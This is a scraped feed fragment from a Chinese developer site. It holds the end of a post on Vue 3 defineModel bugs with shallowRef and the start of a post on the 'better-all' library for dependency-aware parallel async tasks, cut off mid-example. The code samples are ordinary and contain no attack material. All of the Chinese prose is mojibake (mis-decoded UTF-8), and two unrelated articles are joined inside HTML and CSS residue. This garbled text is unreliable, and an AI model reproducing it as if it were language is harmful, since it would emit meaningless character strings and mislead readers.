<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/19142dd4abcc44b4b20f7340d85e3a65~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRmFuZXRoZURpdmluZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534363&amp;x-signature=vlXPp3IZpdIRnWk0DXEHa5WaQCY%3D" alt="image.png" loading="lazy"/></p>
<p>ç„¶è€Œå¦‚æœæ”¹ä¸€ä¸‹å†™æ³•</p>
<pre><code class="hljs language-html" lang="html">  <span class="hljs-tag">&lt;<span class="hljs-name">Child</span>
    <span class="hljs-attr">:model-value</span>=<span class="hljs-string">"countObj"</span>
    @<span class="hljs-attr">update:model-value</span>=<span class="hljs-string">"
      (val) =&gt; {
        debugger
        countObj = val
      }
    "</span>
  /&gt;</span>
</code></pre>
<p>å°±ä¼šå‘ç°<code>@update:model-value</code>æ ¹æœ¬æ²¡è°ƒç”¨ è¿™ä¸€ç‚¹å’Œæ–‡æ¡£æ˜¯ä¸ä¸€è‡´çš„</p>
<p>å¦‚æœcountObjè‡ªèº«è¿˜æ˜¯shallowRef(è™½ç„¶ä¸€èˆ¬ä¹Ÿä¸ä¼šç”¨) é‚£defineModelå°±ä¼šå®Œå…¨å‡ºé”™</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3fb76d001a6b4c35bc402f9225cec056~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRmFuZXRoZURpdmluZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534363&amp;x-signature=gA%2F3s1fCvF5Abjdv%2FQD3f5GUplk%3D" alt="image.png" loading="lazy"/></p>
<p>è¿™é‡Œçš„v-modelç”šè‡³æ˜¯ä¸€ä¸ªå®Œå…¨æ²¡æœ‰å“åº”æ€§çš„å˜é‡ å¯¹å®ƒçš„å˜æ›´ä¸ä¼šè§¦å‘æ¸²æŸ“ ä¹Ÿä¸ä¼šè°ƒç”¨updateäº‹ä»¶</p>
<p>è€Œå¦‚æœä½¿ç”¨ä¹‹å‰çš„å†™æ³•<code>model-value + @update</code> å°±å¯ä»¥æ­£å¸¸ä½¿ç”¨</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"ts"</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">const</span> props = defineProps&lt;{ <span class="hljs-attr">modelValue</span>: { <span class="hljs-attr">count</span>: number } }&gt;()
<span class="hljs-keyword">const</span> emit = defineEmits&lt;{
  <span class="hljs-string">'update:modelValue'</span>: [<span class="hljs-attr">val</span>: { <span class="hljs-attr">count</span>: number }]
}&gt;()
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"m-4"</span>&gt;</span>
    {{ modelValue.count }}
    <span class="hljs-tag">&lt;<span class="hljs-name">el-button</span>
      @<span class="hljs-attr">click</span>=<span class="hljs-string">"
        () =&gt; {
          emit('update:modelValue', { count: modelValue.count + 1 })
        }
      "</span>
    &gt;</span>
      +1
    <span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
</code></pre>
<p>æ€»ç»“ï¼š1.defineModelçš„è¡Œä¸ºä¸æ–‡æ¡£ä¸ä¸€è‡´ 2.shallowRef+defineModelä¼šå¯¼è‡´å®Œå…¨å¤±æ•ˆ</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å‘Šåˆ« Promise.all çš„ä¾èµ–å›°å¢ƒï¼šbetter-all å¦‚ä½•ä¼˜é›…ç®¡ç†å¼‚æ­¥ä»»åŠ¡]]></title>    <link>https://juejin.cn/post/7592906873089523758</link>    <guid>https://juejin.cn/post/7592906873089523758</guid>    <pubDate>2026-01-09T03:35:52.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592906873089523758" data-draft-id="7592884480732233774" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å‘Šåˆ« Promise.all çš„ä¾èµ–å›°å¢ƒï¼šbetter-all å¦‚ä½•ä¼˜é›…ç®¡ç†å¼‚æ­¥ä»»åŠ¡"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,é¢è¯•"/> <meta itemprop="datePublished" content="2026-01-09T03:35:52.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä»£ç è¯—äººå¡å°”"/> <meta itemprop="url" content="https://juejin.cn/user/2067500101533902"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å‘Šåˆ« Promise.all çš„ä¾èµ–å›°å¢ƒï¼šbetter-all å¦‚ä½•ä¼˜é›…ç®¡ç†å¼‚æ­¥ä»»åŠ¡
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2067500101533902/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä»£ç è¯—äººå¡å°”
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T03:35:52.000Z" title="Fri Jan 09 2026 03:35:52 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨ç°ä»£JavaScriptå¼‚æ­¥ç¼–ç¨‹ä¸­ï¼Œ<code>Promise.all</code>æ— ç–‘æ˜¯å¤„ç†å¹¶å‘ä»»åŠ¡çš„åˆ©å™¨ã€‚ç„¶è€Œï¼Œå½“ä»»åŠ¡ä¹‹é—´å­˜åœ¨å¤æ‚çš„ä¾èµ–å…³ç³»æ—¶ï¼Œ<code>Promise.all</code>çš„å±€é™æ€§ä¾¿ä¼šæ˜¾ç°ï¼Œå¼€å‘è€…å¾€å¾€é™·å…¥æ‰‹åŠ¨ä¼˜åŒ–å’Œç»´æŠ¤"ä¾èµ–åœ°ç‹±"çš„å›°å¢ƒã€‚ä»Šå¤©ï¼Œæˆ‘ä»¬å°†æ·±å…¥æ¢è®¨ä¸€ä¸ªåä¸º<code>better-all</code>çš„åº“ï¼Œå®ƒå¦‚ä½•é€šè¿‡å·§å¦™çš„è®¾è®¡ï¼Œä¼˜é›…åœ°è§£å†³äº†è¿™ä¸€ç—›ç‚¹ï¼Œå¹¶å¸¦æ¥äº†æ›´é«˜æ•ˆã€æ›´å¯è¯»çš„å¼‚æ­¥ä»»åŠ¡ç®¡ç†æ–¹å¼ã€‚</p>
<h2 data-id="heading-0">Promise.all çš„å›°å¢ƒï¼šå½“ä¾èµ–é‡ä¸Šå¹¶å‘</h2>
<p><code>Promise.all</code>çš„è®¾è®¡åˆè¡·æ˜¯å¹¶è¡Œæ‰§è¡Œä¸€ç»„ç‹¬ç«‹çš„Promiseï¼Œå¹¶åœ¨æ‰€æœ‰Promiseéƒ½è§£å†³åè¿”å›ç»“æœã€‚ä½†å½“ä»»åŠ¡å­˜åœ¨ä¾èµ–æ—¶ï¼Œäº‹æƒ…å°±å˜å¾—æ£˜æ‰‹äº†ã€‚è®©æˆ‘ä»¬é€šè¿‡å‡ ä¸ªåœºæ™¯æ¥ç†è§£<code>Promise.all</code>åœ¨å¤„ç†ä¾èµ–æ—¶çš„ä¸è¶³ã€‚</p>
<h3 data-id="heading-1">åœºæ™¯ä¸€ï¼šæœ´ç´ çš„ä¸²è¡Œæ‰§è¡Œï¼ˆä½æ•ˆï¼‰</h3>
<p>å‡è®¾æˆ‘ä»¬æœ‰ä¸‰ä¸ªå¼‚æ­¥å‡½æ•° <code>getA()</code>, <code>getB()</code>, <code>getC(a)</code>ï¼Œå…¶ä¸­ <code>getC</code> ä¾èµ–äº <code>getA</code> çš„ç»“æœã€‚å¦‚æœæŒ‰ç…§æœ€ç›´è§‚çš„æ–¹å¼ç¼–å†™ä»£ç ï¼Œå¯èƒ½ä¼šæ˜¯è¿™æ ·ï¼š</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-comment">//Â å‡è®¾Â getAÂ è€—æ—¶Â 1s,Â getBÂ è€—æ—¶Â 10s,Â getCÂ è€—æ—¶Â 10s</span>
<span class="hljs-keyword">const</span>Â [a,Â b]Â =Â <span class="hljs-keyword">await</span>Â <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([<span class="hljs-title function_">getA</span>(),Â <span class="hljs-title function_">getB</span>()])Â <span class="hljs-comment">//Â a:Â 1s,Â b:Â 10sÂ â†’Â æ­¤æ­¥è€—æ—¶Â 10s</span>
<span class="hljs-keyword">const</span>Â cÂ =Â <span class="hljs-keyword">await</span>Â <span class="hljs-title function_">getC</span>(a)Â <span class="hljs-comment">//Â c:Â 10sÂ â†’Â æ­¤æ­¥è€—æ—¶Â 10s</span>
<span class="hljs-comment">//Â æ€»è€—æ—¶çº¦Â 20Â ç§’</span>
</code></pre>
<p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œ<code>getA()</code> å’Œ <code>getB()</code> å¹¶è¡Œæ‰§è¡Œï¼Œè€—æ—¶å–å†³äºè¾ƒæ…¢çš„ <code>getB()</code> (10s)ã€‚ç„¶å <code>getC(a)</code> ä¸²è¡Œæ‰§è¡Œï¼Œåˆè€—æ—¶ 10sã€‚æ€»è€—æ—¶é«˜è¾¾ 20 ç§’ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/08fd778c50b44f3f939e3d947fac3c11~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Luj56CB6K-X5Lq65Y2h5bCU:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534552&amp;x-signature=LAIx%2FUD9lm%2F4uqUAjppcghli3wI%3D" alt="Gemini_Generated_Image_ih0vmrih0vmrih0v (1).png" loading="lazy"/></p>
<h3 data-id="heading-2">åœºæ™¯äºŒï¼šæ‰‹åŠ¨ä¼˜åŒ–ï¼ˆå¤æ‚ä¸”è„†å¼±ï¼‰</h3>
<p>ä¸ºäº†ä¼˜åŒ–ä¸Šè¿°æƒ…å†µï¼Œæˆ‘ä»¬å¯èƒ½ä¼šå°è¯•æ‰‹åŠ¨è°ƒæ•´ Promise çš„ç»„åˆæ–¹å¼ï¼Œè®© <code>getB()</code> å’Œ <code>getC(a)</code> å¹¶è¡Œï¼š</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-comment">//Â å‡è®¾Â getAÂ è€—æ—¶Â 1s,Â getBÂ è€—æ—¶Â 10s,Â getCÂ è€—æ—¶Â 10s</span>
<span class="hljs-keyword">const</span>Â aÂ =Â <span class="hljs-keyword">await</span>Â <span class="hljs-title function_">getA</span>()Â <span class="hljs-comment">//Â a:Â 1sÂ -&gt;Â æ­¤æ­¥è€—æ—¶Â 1s</span>
<span class="hljs-keyword">const</span>Â [b,Â c]Â =Â <span class="hljs-keyword">await</span>Â <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([
Â Â <span class="hljs-comment">//Â b:Â 10s,Â c:Â 10sÂ -&gt;Â æ­¤æ­¥è€—æ—¶Â 10s</span>
Â Â <span class="hljs-title function_">getB</span>(),
Â Â <span class="hljs-title function_">getC</span>(a),
])
<span class="hljs-comment">//Â æ€»è€—æ—¶çº¦Â 11Â ç§’</span>
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6a1c1d6f46954a3991b72cde30165d44~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Luj56CB6K-X5Lq65Y2h5bCU:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534552&amp;x-signature=eKKh80m6Z0kaW04M%2BrvjfqCf8WU%3D" alt="Gemini_Generated_Image_r4mjomr4mjomr4mj (1).png" loading="lazy"/></p>
<p>è¿™æ¬¡ä¼˜åŒ–åï¼Œæ€»è€—æ—¶é™åˆ°äº† 11 ç§’ï¼Œå› ä¸º <code>getA()</code> å®Œæˆåï¼Œ<code>getB()</code> å’Œ <code>getC(a)</code> å¯ä»¥å¹¶è¡Œã€‚çœ‹èµ·æ¥ä¸é”™ï¼Œä½†é—®é¢˜æ¥äº†ï¼šå¦‚æœä»»åŠ¡çš„è€—æ—¶å‘ç”Ÿå˜åŒ–å‘¢ï¼Ÿ</p>
<h3 data-id="heading-3">åœºæ™¯ä¸‰ï¼šæ‰‹åŠ¨ä¼˜åŒ–çš„åå™¬ï¼ˆéš¾ä»¥ç»´æŠ¤ï¼‰</h3>
<p>å‡è®¾ç°åœ¨ <code>getA()</code> è€—æ—¶ 10 ç§’ï¼Œè€Œ <code>getC()</code> è€—æ—¶ 1 ç§’ã€‚æˆ‘ä»¬å†æ¥çœ‹çœ‹æ‰‹åŠ¨ä¼˜åŒ–åçš„ä»£ç è¡¨ç°ï¼š</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-comment">//Â å‡è®¾Â getAÂ è€—æ—¶Â 10s,Â getBÂ è€—æ—¶Â 10s,Â getCÂ è€—æ—¶Â 1s</span>
<span class="hljs-keyword">const</span>Â aÂ =Â <span class="hljs-keyword">await</span>Â <span class="hljs-title function_">getA</span>()Â <span class="hljs-comment">//Â a:Â 10sÂ -&gt;Â æ­¤æ­¥è€—æ—¶Â 10s</span>
<span class="hljs-keyword">const</span>Â [b,Â c]Â =Â <span class="hljs-keyword">await</span>Â <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([
Â Â <span class="hljs-comment">//Â b:Â 10s,Â c:Â 1sÂ -&gt;Â æ­¤æ­¥è€—æ—¶Â 10s</span>
Â Â <span class="hljs-title function_">getB</span>(),
Â Â <span class="hljs-title function_">getC</span>(a),
])
<span class="hljs-comment">//Â æ€»è€—æ—¶çº¦Â 20Â ç§’</span>
</code></pre>
<p>æ­¤æ—¶ï¼Œæ€»è€—æ—¶åˆå›åˆ°äº† 20 ç§’ï¼è€Œæœ€åˆçš„æœ´ç´ å†™æ³•ï¼ˆåœºæ™¯ä¸€ï¼‰åœ¨åŒæ ·çš„æƒ…å†µä¸‹ï¼Œæ€»è€—æ—¶å´æ˜¯ 11 ç§’ï¼š</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-comment">//Â æœ´ç´ å†™æ³•åœ¨ç›¸åŒè€—æ—¶ä¸‹çš„è¡¨ç°ï¼š</span>
<span class="hljs-comment">//Â å‡è®¾Â getAÂ è€—æ—¶Â 10s,Â getBÂ è€—æ—¶Â 10s,Â getCÂ è€—æ—¶Â 1s</span>
<span class="hljs-keyword">const</span>Â [a,Â b]Â =Â <span class="hljs-keyword">await</span>Â <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([<span class="hljs-title function_">getA</span>(),Â <span class="hljs-title function_">getB</span>()])Â <span class="hljs-comment">//Â a:Â 10s,Â b:Â 10sÂ â†’Â æ­¤æ­¥è€—æ—¶Â 10s</span>
<span class="hljs-keyword">const</span>Â cÂ =Â <span class="hljs-keyword">await</span>Â <span class="hljs-title function_">getC</span>(a)Â <span class="hljs-comment">//Â c:Â 1sÂ â†’Â æ­¤æ­¥è€—æ—¶Â 1s</span>
<span class="hljs-comment">//Â æ€»è€—æ—¶çº¦Â 11Â ç§’</span>
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a453295c56ae435c9733a727841b35b6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Luj56CB6K-X5Lq65Y2h5bCU:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534552&amp;x-signature=2hsZZNkgdaVYjZZB%2BapmGuD8DfA%3D" alt="Gemini_Generated_Image_g2lawjg2lawjg2la (1).png" loading="lazy"/></p>
<p>è¿™è¯´æ˜æ‰‹åŠ¨ä¼˜åŒ–ä¸ä»…å¤æ‚ï¼Œè€Œä¸”éå¸¸è„†å¼±ï¼Œéš¾ä»¥é€‚åº”ä»»åŠ¡è€—æ—¶çš„åŠ¨æ€å˜åŒ–ã€‚åœ¨çœŸå®ä¸–ç•Œä¸­ï¼Œä»»åŠ¡çš„è€—æ—¶å¾€å¾€å—ç½‘ç»œã€æœåŠ¡å™¨è´Ÿè½½ç­‰å¤šç§å› ç´ å½±å“ï¼Œæ˜¯ä¸å¯é¢„æµ‹çš„ã€‚ä¸ºäº†æ­£ç¡®ä¼˜åŒ–ï¼Œä½ ç”šè‡³éœ€è¦æ‰‹åŠ¨åˆ†æå¹¶å£°æ˜å¤æ‚çš„ä¾èµ–å›¾ï¼Œè¿™ä¼šè¿…é€Ÿå¯¼è‡´ä»£ç éš¾ä»¥ç®¡ç†å’Œé˜…è¯»ï¼š</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">const</span>Â [[a,Â c],Â b]Â =Â <span class="hljs-keyword">await</span>Â <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([<span class="hljs-title function_">getA</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">a</span>)Â =&gt;</span>Â <span class="hljs-title function_">getC</span>(a).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">c</span>)Â =&gt;</span>Â [a,Â c])),Â <span class="hljs-title function_">getB</span>()])
</code></pre>
<h2 data-id="heading-4">better-all çš„è§£å†³æ–¹æ¡ˆï¼šè‡ªåŠ¨ä¾èµ–ä¼˜åŒ–ä¸ç±»å‹æ¨æ–­</h2>
<p><code>better-all</code>åº“çš„æ ¸å¿ƒæ€æƒ³æ˜¯æä¾›ä¸€ä¸ªå¢å¼ºç‰ˆçš„<code>all</code>å‡½æ•°ï¼Œå®ƒå…è®¸å¼€å‘è€…ä»¥å£°æ˜å¼çš„æ–¹å¼å®šä¹‰å¼‚æ­¥ä»»åŠ¡åŠå…¶ä¾èµ–ï¼Œè€Œæ— éœ€æ‰‹åŠ¨ç®¡ç†Promiseé“¾æˆ–å¤æ‚çš„åµŒå¥—ã€‚å®ƒä¼šè‡ªåŠ¨åˆ†æä»»åŠ¡é—´çš„ä¾èµ–å…³ç³»ï¼Œå¹¶å°½å¯èƒ½åœ°å¹¶è¡Œæ‰§è¡Œä»»åŠ¡ï¼Œä»è€Œå®ç°æœ€å¤§åŒ–çš„å¹¶å‘ä¼˜åŒ–ã€‚</p>
<p>è®©æˆ‘ä»¬çœ‹çœ‹<code>better-all</code>å¦‚ä½•ä¼˜é›…åœ°è§£å†³ä¸Šè¿°é—®é¢˜ï¼š</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">import</span>Â {Â allÂ }Â <span class="hljs-keyword">from</span>Â <span class="hljs-string">'better-all'</span>

<span class="hljs-keyword">const</span>Â {Â a,Â b,Â cÂ }Â =Â <span class="hljs-keyword">await</span>Â <span class="hljs-title function_">all</span>({
Â Â <span class="hljs-keyword">async</span>Â <span class="hljs-title function_">a</span>(<span class="hljs-params"/>)Â {
Â Â Â Â <span class="hljs-keyword">return</span>Â <span class="hljs-title function_">getA</span>()
Â Â },Â <span class="hljs-comment">//Â å‡è®¾è€—æ—¶Â 1s</span>
Â Â <span class="hljs-keyword">async</span>Â <span class="hljs-title function_">b</span>(<span class="hljs-params"/>)Â {
Â Â Â Â <span class="hljs-keyword">return</span>Â <span class="hljs-title function_">getB</span>()
Â Â },Â <span class="hljs-comment">//Â å‡è®¾è€—æ—¶Â 10s</span>
Â Â <span class="hljs-keyword">async</span>Â <span class="hljs-title function_">c</span>(<span class="hljs-params"/>)Â {
Â Â Â Â <span class="hljs-keyword">return</span>Â <span class="hljs-title function_">getC</span>(<span class="hljs-keyword">await</span>Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">$</span>.<span class="hljs-property">a</span>)
Â Â },Â <span class="hljs-comment">//Â å‡è®¾è€—æ—¶Â 10sï¼Œä¾èµ–ä»»åŠ¡Â a</span>
})
<span class="hljs-comment">//Â æ€»è€—æ—¶çº¦Â 11Â ç§’Â -Â å®ç°äº†æœ€ä¼˜å¹¶è¡ŒåŒ–ï¼</span>
</code></pre>
<p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œ<code>better-all</code>ä¼šè‡ªåŠ¨è¯†åˆ«å‡ºä»»åŠ¡<code>c</code>ä¾èµ–äºä»»åŠ¡<code>a</code>ã€‚å®ƒä¼šç«‹å³å¯åŠ¨æ‰€æœ‰ä»»åŠ¡ï¼Œå½“ä»»åŠ¡<code>c</code>æ‰§è¡Œåˆ°<code>await this.$.a</code>æ—¶ï¼Œå¦‚æœä»»åŠ¡<code>a</code>å°šæœªå®Œæˆï¼Œå®ƒä¼šç­‰å¾…<code>a</code>å®Œæˆï¼›åŒæ—¶ï¼Œä»»åŠ¡<code>b</code>ä¼šç‹¬ç«‹å¹¶è¡Œæ‰§è¡Œã€‚è¿™æ ·ï¼Œ<code>better-all</code>åœ¨ä¿è¯ä¾èµ–é¡ºåºçš„åŒæ—¶ï¼Œæœ€å¤§é™åº¦åœ°æå‡äº†å¹¶è¡Œåº¦ï¼Œ<strong>æ— è®ºä»»åŠ¡è€—æ—¶å¦‚ä½•å˜åŒ–ï¼Œéƒ½èƒ½ä¿æŒæœ€ä¼˜æˆ–æ¥è¿‘æœ€ä¼˜çš„æ‰§è¡Œæ•ˆç‡</strong>ã€‚</p>
<p><code>better-all</code>çš„"é­”æ³•"åœ¨äºå…¶<code>this.$</code>å¯¹è±¡ï¼Œå®ƒè®©ä½ èƒ½å¤Ÿä»¥è‡ªç„¶çš„æ–¹å¼è®¿é—®å…¶ä»–ä»»åŠ¡çš„ç»“æœï¼ˆä½œä¸ºPromiseï¼‰ï¼Œä»è€Œæ¸…æ™°åœ°è¡¨è¾¾ä¾èµ–å…³ç³»ã€‚åº“ä¼šç¡®ä¿æ‰€æœ‰ä»»åŠ¡å°½æ—©å¯åŠ¨ï¼Œå¹¶åœ¨é‡åˆ°ä¾èµ–æ—¶æ™ºèƒ½ç­‰å¾…ã€‚</p>
<h3 data-id="heading-5">æ›´å¤šåº”ç”¨åœºæ™¯</h3>
<p><strong>å¸¦æœ‰ä¾èµ–çš„ä»»åŠ¡ï¼š</strong></p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">const</span>Â {Â user,Â profile,Â settingsÂ }Â =Â <span class="hljs-keyword">await</span>Â <span class="hljs-title function_">all</span>({
Â Â <span class="hljs-keyword">async</span>Â <span class="hljs-title function_">user</span>(<span class="hljs-params"/>)Â {
Â Â Â Â <span class="hljs-keyword">return</span>Â <span class="hljs-title function_">fetchUser</span>(<span class="hljs-number">1</span>)
Â Â },
Â Â <span class="hljs-keyword">async</span>Â <span class="hljs-title function_">profile</span>(<span class="hljs-params"/>)Â {
Â Â Â Â <span class="hljs-keyword">return</span>Â <span class="hljs-title function_">fetchProfile</span>((<span class="hljs-keyword">await</span>Â <span class="hljs-variable language_">this</span>.<span class="hljs-property">$</span>.<span class="hljs-property">user</span>).<span class="hljs-property">id</span>)
Â Â },
Â Â <span class="hljs-keyword">async</span>Â <span class="hljs-title function_">settings</span>(<span class="hljs-params"/>)Â {
